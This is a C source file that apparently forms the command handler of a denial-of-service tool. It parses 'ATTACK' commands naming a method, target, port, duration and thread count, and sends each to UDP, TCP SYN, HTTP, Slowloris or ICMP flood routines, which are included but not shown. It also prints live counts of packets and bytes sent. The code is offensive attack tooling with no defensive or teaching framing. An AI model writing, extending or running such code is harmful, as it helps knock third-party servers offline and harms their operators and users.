#include "command_handler.h"
#include "attack_methods.h"
#include "ascii_art.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void execute_attack_command(const char* command) {
    char method[50], target[256];
    int port, duration, threads;
    
    printf("\033[1;35m[*] Parsing attack command...\033[0m\n");
    
    // Parse different command formats
    if(sscanf(command, "ATTACK %49s %255s %d %d %d", method, target, &port, &duration, &threads) == 5) {
        print_attack_details(method, target, port, duration, threads);
        
        if(strcmp(method, "UDP-FLOOD") == 0) {
            start_udp_flood(target, port, duration, threads);
        }
        else if(strcmp(method, "TCP-SYN") == 0) {
            start_tcp_syn(target, port, duration, threads);
        }
        else if(strcmp(method, "HTTP-FLOOD") == 0) {
            start_http_flood(target, port, duration, threads);
        }
        else if(strcmp(method, "SLOWLORIS") == 0) {
            start_slowloris(target, port, duration, threads);
        }
        else {
            printf("\033[1;31m[!] Unknown attack method: %s\033[0m\n", method);
        }
    }
    else if(sscanf(command, "ATTACK %49s %255s %d %d", method, target, &duration, &threads) == 4) {
        // For attacks that don't need port (like ICMP)
        print_attack_details(method, target, 0, duration, threads);
        
        if(strcmp(method, "ICMP-FLOOD") == 0) {
            start_icmp_flood(target, duration, threads);
        }
        else {
            printf("\033[1;31m[!] Unknown attack method: %s\033[0m\n", method);
        }
    }
    else {
        printf("\033[1;31m[!] Invalid command format\033[0m\n");
        printf("Usage: ATTACK <method> <target> <port> <duration> <threads>\n");
        printf("Or: ATTACK <method> <target> <duration> <threads> (for ICMP)\n");
    }
}

void show_attack_stats() {
    printf("\033[1;33m");
    printf("┌────────────────────── CURRENT STATISTICS ─────────────────────┐\n");
    printf("│ Active Threads:   %-40d │\n", active_threads);
    printf("│ Total Packets:    %-40lld │\n", total_packets_sent);
    printf("│ Total Bytes:      %-40lld │\n", total_bytes_sent);
    printf("│ Attack Status:    %-40s │\n", attack_active ? "ACTIVE" : "INACTIVE");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}
